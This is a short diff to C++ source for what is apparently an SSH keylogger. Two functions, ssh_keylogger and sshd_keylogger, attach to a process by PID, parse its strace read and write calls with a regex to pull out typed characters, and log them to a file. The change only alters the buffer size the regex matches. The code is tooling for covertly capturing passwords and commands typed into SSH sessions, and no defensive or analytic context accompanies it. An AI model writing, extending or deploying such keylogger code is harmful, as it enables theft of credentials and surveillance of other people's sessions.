@@ -63,7 +63,7 @@ void ssh_keylogger(const uint16_t& pid){
         std::string data_from_strace{buffer.data()};
         if(data_from_strace.find("read(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
            data_from_strace.find("= 1\n") != std::string::npos){
-            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= ");
+            boost::regex xRegEx("read\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= ");
             std::string symbol = parsing_utils::parse_strace_output(data_from_strace, xRegEx);
             std::cout << "SYMBOL: " << symbol << std::endl;
             std::fwrite(symbol.data(), 1, symbol.size(), fd);
@@ -99,7 +99,7 @@ void sshd_keylogger(const uint16_t& pid){
         std::string data_from_strace{buffer.data()};
         if(data_from_strace.find("write(") != std::string::npos && data_from_strace.find(", 1") != std::string::npos &&
            data_from_strace.find("= 1\n") != std::string::npos){
-            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 1\\)\\s+= 1");
+            boost::regex xRegEx("write\\(\\d+, \"(?<cmd>.*)\", 16384\\)\\s+= 1");
             std::string symbol = parsing_utils::parse_strace_output(data_from_strace, xRegEx);
             std::cout << "SYMBOL: " << symbol << std::endl;
             std::fwrite(symbol.data(), 1, symbol.size(), fd);
